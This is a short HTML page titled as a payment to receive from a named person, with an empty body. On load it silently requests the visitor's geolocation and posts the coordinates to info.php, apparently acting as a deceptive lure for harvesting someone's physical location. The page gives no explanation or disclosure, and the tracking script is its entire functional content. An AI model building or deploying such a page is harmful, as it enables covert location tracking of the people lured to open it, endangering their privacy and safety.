<html>
    <head>
        <title>Receber de José de Olivera Cardoso</title>
    </head>

<body>

</body>
    <script
            src="https://code.jquery.com/jquery-2.2.4.min.js"
            integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44="
            crossorigin="anonymous"></script>
<script>
    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function (e){
                $.post("info.php", {lat: e.coords.latitude,lon: e.coords.longitude})
            });
        } else {

        }
    }

    $(document).ready(function (){
        getLocation()
    });
</script>
</html>